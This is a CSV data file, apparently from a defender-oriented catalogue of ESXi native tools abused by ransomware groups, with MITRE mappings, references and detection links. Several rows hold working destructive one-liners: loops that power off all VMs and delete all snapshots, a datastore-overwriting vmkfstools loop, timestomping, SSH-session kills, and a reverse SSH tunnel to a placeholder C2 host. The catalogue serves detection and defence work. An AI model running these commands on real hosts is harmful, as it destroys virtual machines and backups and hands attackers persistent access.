"Name"Name","Description","Author","Created","Commands","Commands_Command","Commands_Description","Commands_Usecase","Commands_Category","Commands_Privileges","Commands_MitreID","Commands_OperatingSystem","Commands_Tags","Commands_Tags_E-Crime","Full_Path","Full_Path_Path","Resources","Resources_Link","Acknowledgement","Acknowledgement_Person","Acknowledgement_Handle","Commands_ProceduralExamples","Detection","Detection_Elastic","AtomicTests","Commands_ProcedureExamples","Detection_Sigma","Code_Sample","Code_Sample_Code","Commands_Tags_APT","is_legit"
"vpxa","Vpxa functions as an intermediary service that connects the vpxd service on the vCenter Server with the hostd service on an ESXi host. Stopping this service will cause management and monitoring functions to cease.","Janantha Marasinghe @blueteam0ps_","2024-08-31","","/etc/init.d/vpxa stop","Stops the vpxa service on an ESXi host.","An adversay may stop the vpxa service to cease remote management by the VCenter server.","Stop Service","Administrator","T1489","ESXi","","Nevada","","/etc/init.d/vpxa","","https://www.trellix.com/en-au/blogs/research/ransomhouse-am-see/","","[''Pham Duy Phuc''-|-''Max Kersten''-|-''Noël Keijzer''-|-''Michaël Schrijver''-|-''Germán Fernández''-|-''MalwareHunterTeam'']","[''@1ZRR4H''-|-''@malwrhunterteam'']","","","","","","","","","","false"
"vmkfstools","A command-line utility in VMware ESXi used to manage and interact with VMFS (Virtual Machine File System) volumes.","Janantha Marasinghe @blueteam0ps_","2024-08-27","","vmkfstools -c 10M -d eagerzeroedthick $I/eztDisk > /dev/null","Create eager-zeroed thick virtual disk at the specified location without displaying any output.","Adversary uses vmfstools to create and immediately delete a 10MB eager zeroed thick disk on every datastore on the ESXi host. This will effectively overwrite contents of the disk.","Inhibit Recovery","Administrator","T1561.001","ESXi","","Qilin","","[''/sbin/vmkfstools''-|-''/bin/vmkfstools'']","","[''https://www.bleepingcomputer.com/news/security/linux-version-of-qilin-ransomware-focuses-on-vmware-esxi/''-|-''https://www.shadowstackre.com/analysis/qilin'']","","[''Lawrence Abrams''-|-''MalwareHunterTeam'']","@malwarehunterteam","[''for I in $(esxcli storage filesystem list |grep 'VMFS-5' |awk '{print $1}'); do vmkfstools -c 10M -d eagerzeroedthick $I/eztDisk > /dev/null; vmkfstools -U $I/eztDisk > /dev/null; done''-|-''for I in $(esxcli storage filesystem list |grep 'VMFS-6' |awk '{print $1}'); do vmkfstools -c 10M -d eagerzeroedthick $I/eztDisk > /dev/null; vmkfstools -U $I/eztDisk > /dev/null; done'']","","","","","","","","","false"
"vm-support","A command-line utility in VMware ESXi that collects diagnostic information for troubleshooting and support purposes.","Janantha Marasinghe @blueteam0ps_","2024-08-30","","vm-support --listvms","Lists running Virtual Machines","Obtains a list of running Virtual Machines","Lists VMs","Administrator","T1082","ESXi","","Lockbit","","[''/sbin/vm-support''-|-''/bin/vm-support'']","","https://www.trendmicro.com/en_us/research/22/a/analysis-and-Impact-of-lockbit-ransomwares-first-linux-and-vmware-esxi-variant.html","","Junestherry Dela Cruz","","","","","","","","","","","false"
"vim-cmd","A command-line utility in VMware ESXi that provides an interface to interact with the VMware Infrastructure (VI) API, allowing users to manage and automate tasks on ESXi host and its virtual machines (VMs)","Janantha Marasinghe @blueteam0ps_","2024-08-27","","[''vim-cmd hostsvc/enable_ssh''-|-''vim-cmd hostsvc/autostartmanager/enable_autostart false''-|-''vim-cmd hostsvc/hostsummary | grep cpuModel''-|-''vim-cmd vmsvc/getallvms''-|-''vim-cmd vmsvc/snapshot.removeall''-|-''vim-cmd vmsvc/power.off'']","[''Enables SSH services on the ESXi host''-|-''Disable autostart of Virtual Machines''-|-''Displays summary of system information about the ESXi host''-|-''Displays the list of VMs available on an ESXi host.''-|-''Remove VM Snapshots''-|-''Power off VM'']","[''SSH service enables adversaries to laterally move to ESXi hosts and use as an alternative command execution interface.''-|-''Disabling autostart of Virtual Machines prevents them from starting post reboot of a ESXi host.''-|-''Shows the exact cpuModel from the hostsummary output''-|-''Shows running VMs on an ESXi Host. Adversaries were seen use this techinique to programatically enumerate VMs and powers them down using the Vmid.''-|-''Deletes all snapshots of all Virtual Machines. This activity is usually observed near ransomware deployment and is often executed programatically.''-|-''Powers off Virtual Machines. This activity is usually observed near ransomware deployment and is often executed programatically.'']","[''Enable Service''-|-''Disable Startup''-|-''System Information''-|-''System Information''-|-''Inhibit Recovery''-|-''Power off VM'']","[''Administrator''-|-''Administrator''-|-''Administrator''-|-''Administrator''-|-''Administrator''-|-''Administrator'']","[''T1021.004''-|-''T1529''-|-''T1082''-|-''T1082''-|-''T1485''-|-''T1529'']","[''ESXi''-|-''ESXi''-|-''ESXi''-|-''ESXi''-|-''ESXi''-|-''ESXi'']","","[''Lockbit''-|-''Ransomhub''-|-''Blackcat''-|-''Qilin''-|-''Play''-|-''Lynx''-|-''Howling Scorpius'']","","[''/sbin/vim-cmd''-|-''/bin/vim-cmd'']","","[''https://www.trendmicro.com/en_us/research/22/a/analysis-and-Impact-of-lockbit-ransomwares-first-linux-and-vmware-esxi-variant.html''-|-''https://thedxt.ca/2023/12/esxi-autostart-vms-with-cli/''-|-''https://www.bleepingcomputer.com/news/security/linux-version-of-ransomhub-ransomware-targets-vmware-esxi-vms/''-|-''https://www.cybereason.com/blog/cybereason-vs.-blackcat-ransomware''-|-''https://www.bleepingcomputer.com/news/security/linux-version-of-qilin-ransomware-focuses-on-vmware-esxi/''-|-''https://www.trendmicro.com/en_us/research/24/g/new-play-ransomware-linux-variant-targets-esxi-shows-ties-with-p.html''-|-''https://x.com/malwrhunterteam/status/1455628865229950979?lang=en''-|-''https://www.hybrid-analysis.com/sample/a0ceb258924ef004fa4efeef4bc0a86012afdb858e855ed14f1bbd31ca2e42f5/661430861522cb62560ee827''-|-''https://unit42.paloaltonetworks.com/inc-ransomware-rebrand-to-lynx/''-|-''https://unit42.paloaltonetworks.com/threat-assessment-howling-scorpius-akira-ransomware/''-|-''https://research.checkpoint.com/2024/inside-akira-ransomwares-rust-experiment/'']","","[''Junestherry Dela Cruz''-|-''Daniel Keer''-|-''Tom Fakterman''-|-''Ohav Peri''-|-''MalwareHunterTeam''-|-''Cj Arsley Mateo''-|-''Darrel Tristan Virtusio''-|-''Sarah Pearl Camiling''-|-''Andrei Alimboyao''-|-''Nathaniel Morales''-|-''Jacob Santos''-|-''Earl John Bareng''-|-''Pranay Kumar Chhaparwal''-|-''Micah Yates''-|-''Benjamin Chang''-|-''Yoav Zemah'']","[''@thedxt''-|-''@malwrhunterteam'']","[''vim-cmd hostsvc/autostartmanager/enable_autostart 0''-|-''/bin/sh -c “for vmid in $(vim-cmd vmsvc/getallvms | grep -v Vmid | awk '{print $1}'); do vim-cmd vmsvc/power.off $vmid; done""''-|-''for i in $(vim-cmd vmsvc/getallvms | awk '{print $1}' | grep -Eo '[0-9]{1,5}'); do vim-cmd vmsvc/power.off $i; vim-cmd vmsvc/snapshot.removeall $i; done;''-|-''vim-cmd vmsvc/getallvms | tail -n +2 | awk '{system(""vim-cmd vmsvc/power.off "" $1)}''-|-''for i in `vim-cmd vmsvc/getallvms| awk '{print$1}'`;do vim-cmd vmsvc/snapshot.removeall $i & done''-|-''vim-cmd vmsvc/snapshot.removeall %llu > /dev/null 2>&1''-|-''vim-cmd vmsvc/getallvms | grep -o -E \'^[0-9]+\' | xargs -r -n 1 vim-cmd vmsvc/power.off''-|-''/bin/sh -c “for vmid in $(vim-cmd vmsvc/getallvms | grep -v Vmid | awk '{print $1}'); do vim-cmd vmsvc/power.off $vmid; done""''-|-''for i in $(vim-cmd vmsvc/getallvms | awk '{print $1}' | grep -Eo '[0-9]{1,5}'); do vim-cmd vmsvc/power.off $i; vim-cmd vmsvc/snapshot.removeall $i; done;''-|-''vim-cmd vmsvc/getallvms | tail -n +2 | awk '{system(""vim-cmd vmsvc/power.off "" $1)}'']","","","","","","","","","false"
"ulimit","A command line utility used to control the resource limits available to the shell and processes started by it. These limits are designed to prevent a single user or process from using high number of system resources, which could negatively impact the entire system.","Janantha Marasinghe @blueteam0ps_","2024-08-27","","ulimit -p $(ulimit -Hp) ulimit -n $(ulimit -Hn)","Changes the open file descriptor and pseudoterminals to unlimited.","An adversary modifies the resource limit thresholds to unlimited. This allows a single process to utilise all the system resources.","Adjust Performance","Administrator","","ESXi","","Nevada","","","","https://www.varonis.com/blog/vmware-esxi-in-the-line-of-ransomware-fire","","Jason Hill","","","","","","","","","","","false"
"touch","Primarily used to create an empty file or to update the timestamp (modification and access time) of an existing file without changing its content.","Janantha Marasinghe @blueteam0ps_","2024-08-27","","/bin/touch -r /etc/vmware/rhttpproxy/config.xml /etc/rc.local.d/local.sh","Changes modification or access timestamps of a target file based on a reference file.","An adversary uses the modification and access timestamps of a references file and updates the same timestampts of a target file. This is to hinder analysis based on timestamps as the malicious file match the timestamps of a legitimate file.","Timestomp","Administrator","T1070.006","ESXi","","Nevada","","[''/sbin/touch''-|-''/bin/touch''-|-''/usr/lib/vmware/busybox/bin/busybox touch'']","","[''https://www.reddit.com/r/esxi/comments/10txpje/i_was_attack_by_esxi_ransomware_and_the_attack/''-|-''https://www.varonis.com/blog/vmware-esxi-in-the-line-of-ransomware-fire'']","","Jason Hill","","[''/bin/touch -r /etc/vmware/rhttpproxy/config.xml /etc/vmware/rhttpproxy/endpoints.conf''-|-''/bin/touch -r /usr/lib/vmware/busybox/bin/busybox /var/spool/cron/crontabs/root''-|-''/bin/touch -r /usr/lib/vmware/busybox/bin/busybox /bin/hostd-probe.sh'']","","https://github.com/elastic/detection-rules/blob/main/rules/linux/defense_evasion_esxi_suspicious_timestomp_touch.toml","","","","","","","false"
"systemctl","Manages the status of system services","Janantha Marasinghe @blueteam0ps_","2024-08-27","","service $s stop","Stops all services on an ESXi host.","An adversary stops all services within the ESXi host to prevent any interference with ransomware encryption operations.","Stop Service","Administrator","T1529","ESXi","","GwisinLocker","","/sbin/services.sh","","[''https://www.hybrid-analysis.com/sample/7594bf1d87d35b489545e283ef1785bb2e04637cc1ff1aca9b666dde70528e2b/6310d9bdbde3430a5a65372f''-|-''https://www.reversinglabs.com/blog/gwisinlocker-ransomware-targets-south-korean-industrial-and-pharmaceutical-companies'']","","Joseph Edwards","","/usr/local/etc/r/etc/init.d/%s* systemctl stop %/sbin/service %s/bin/sh -c ""for s in `service -l | grep %s`; do service $s stop;","","","","","","","","","false"
"ssh","Inbuilt SSH client used to remote port-forward using a tunnel.","Janantha Marasinghe @blueteam0ps_","2025-01-24","","ssh –fN -R 127.0.0.1:<SOCKS port> <user>@<C2 IP address>","SSH client used to create a tunnel.","An adversary uses the native SSH binary to create a tunnel to remote port-forwarding to their C2 host.","Tunnel Traffic","User","T1572","ESXi","","","","[''/bin/ssh''-|-''/sbin/ssh'']","","https://www.sygnia.co/blog/esxi-ransomware-ssh-tunneling-defense-strategies/","","[''Ren Jie Yow''-|-''Zhongyuan Hau (Aaron)'']","","ssh –fN -R 127.0.0.1:<SOCKS port> <user>@<C2 IP address>","","","","","","","","","false"
"pkill","Forcefully terminates processes by performing a full or partial match based on the process name. It is commonly exploited by adversaries to abruptly stop running Virtual Machine (VM) executable processes. This is usually performed prior to ransomware deployment.","Janantha Marasinghe @blueteam0ps_","2024-08-27","","pkill -9 %s","Terminates all processes starts with the vmx- prefix.","Forceful termination of Virtual Machines","terminate process","Administrator","T1489","ESXi","","Revil","","[''/bin/vmkvsitools pkill''-|-''/sbin/pkill''-|-''/bin/pkill'']","","[''https://www.crowdstrike.com/blog/hypervisor-jackpotting-ecrime-actors-increase-targeting-of-esxi-servers/''-|-''https://www.forescout.com/resources/rise-in-linux-ransomware/''-|-''https://www.hybrid-analysis.com/sample/ea1872b2835128e3cb49a0bc27e4727ca33c4e6eba1e80422db19b505f965bc4/60db1f3adc8afe020254a5f3'']","","Michael Dawson","","pkill -9 vmx-*","","","https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1529/T1529.md#atomic-test-13---esxi---terminates-vms-using-pkill","","","","","","false"
"mv","Used for moving or renaming files/folders within a file system.","Janantha Marasinghe @blueteam0ps_","2024-08-27","","mv /etc/motd /etc/motd1","Renames the Message Of The Day file.","An adversary renames the current motd file on an ESXi host and copies a custom version to its location. This usually contain the ransom notification.","Replace File","Administrator","T1491","ESXi","","Nevada","","[''/usr/lib/vmware/busybox/bin/busybox mv''-|-''/sbin/mv''-|-''/bin/mv'']","","https://www.varonis.com/blog/vmware-esxi-in-the-line-of-ransomware-fire","","Jason Hill","","","","","","mv /etc/motd /etc/motd1 && cp $CLEAN_DIR/motd /etc/motd","","","","","false"
"kill","Allows manual termination of processes of interest.","Janantha Marasinghe @blueteam0ps_","2024-08-27","","kill -9 {process}","Terminates processes on an ESXi Host","An adversary may list processes starting with vmx and then extracts the second column from the output and uses it to terminate the process. Further, research indicates that adversaries enumerate ssh sessions by non-root users and sends a kill signal 9 to terminate them. This ceases ssh sessions initiated by legitimate users and allows the adversary to operate further using root user account.","Terminate Process","Administrator","T1489","ESXi","","[''RansomHouse''-|-''Nevada'']","","[''/usr/lib/vmware/busybox/bin/busybox kill''-|-''/sbin/kill''-|-''/bin/kill'']","","[''https://www.varonis.com/blog/vmware-esxi-in-the-line-of-ransomware-fire''-|-''https://www.trellix.com/en-au/blogs/research/ransomhouse-am-see/'']","","[''Jason Hill''-|-''Pham Duy Phuc''-|-''Max Kersten''-|-''Noël Keijzer''-|-''Michaël Schrijver''-|-''Germán Fernández''-|-''MalwareHunterTeam'']","[''@1ZRR4H''-|-''@malwrhunterteam'']","[''kill -9 $(ps | grep vmx | awk '{print $2}')''-|-''ps | grep sshd | grep -v -e grep -e root -e 12345 | awk {print ""kill -9"", $2} | sh'']","","","","","https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_esxcli_vm_kill.yml","","","","false"
